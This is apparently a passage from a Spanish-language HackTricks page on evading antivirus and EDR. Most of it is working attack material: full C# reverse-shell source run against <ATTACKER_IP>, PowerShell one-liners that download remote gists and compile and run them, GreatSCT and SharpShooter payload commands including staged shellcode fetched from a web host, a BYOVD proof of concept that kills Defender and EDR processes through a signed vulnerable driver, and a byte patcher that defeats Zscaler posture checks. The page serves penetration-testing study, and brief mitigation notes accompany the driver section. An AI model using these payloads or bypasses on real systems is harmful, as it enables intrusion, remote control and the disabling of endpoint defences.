- No inicies `winvnc` si ya está en ejecución o activarás un [popup](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o causará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o activarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo de: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** la **carga útil xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer Revershell en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir ejemplos de inyectores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR Desde el Espacio del Núcleo

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones de endpoint antes de soltar ransomware. La herramienta trae su **propio controlador vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas del núcleo que incluso los servicios AV de Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Controlador firmado**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el controlador legítimamente firmado `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el controlador tiene una firma válida de Microsoft, se carga incluso cuando la Aplicación de Aplicación de Firma de Controladores (DSE) está habilitada.
2. **Instalación del servicio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el controlador como un **servicio del núcleo** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde el espacio de usuario.
3. **IOCTLs expuestos por el controlador**
| Código IOCTL | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (utilizado para eliminar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el controlador y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**:  BYOVD omite completamente las protecciones en modo usuario; el código que se ejecuta en el núcleo puede abrir procesos *protegidos*, terminarlos o manipular objetos del núcleo independientemente de PPL/PP, ELAM u otras características de endurecimiento.

Detección / Mitigación
•  Habilitar la lista de bloqueo de controladores vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.
•  Monitorear la creación de nuevos servicios *del núcleo* y alertar cuando un controlador se carga desde un directorio escribible por el mundo o no está presente en la lista de permitidos.
•  Observar los manejadores en modo usuario a objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Bypass de las Comprobaciones de Postura del Cliente Zscaler a través de Parcheo de Binarios en Disco

El **Client Connector** de Zscaler aplica reglas de postura del dispositivo localmente y se basa en RPC de Windows para comunicar los resultados a otros componentes. Dos elecciones de diseño débiles hacen posible un bypass completo:

1. La evaluación de postura ocurre **totalmente del lado del cliente** (se envía un booleano al servidor).
2. Los puntos finales RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (a través de `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco**, ambos mecanismos pueden ser neutralizados:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1` por lo que cada verificación es conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso no firmado) puede enlazarse a los tubos RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazado por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Cortocircuitado |

Extracto del parcheador mínimo:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las verificaciones de postura muestran **verde/compliant**.
* Los binarios no firmados o modificados pueden abrir los puntos finales de RPC de named-pipe (por ejemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las simples verificaciones de firma pueden ser derrotadas con algunos parches de bytes.

## Referencias

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
